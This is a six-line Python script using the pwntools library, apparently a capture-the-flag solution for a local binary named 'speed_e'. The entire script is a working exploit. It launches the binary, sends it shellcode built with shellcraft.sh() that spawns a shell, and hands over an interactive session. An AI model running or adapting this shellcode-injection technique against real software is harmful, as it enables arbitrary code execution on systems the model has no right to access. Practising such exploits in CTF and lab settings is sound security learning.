from pwn import *

elf = context.binary = ELF('./speed_e')
io = process(elf.path)
io.sendline(asm(shellcraft.sh()))
io.interactive()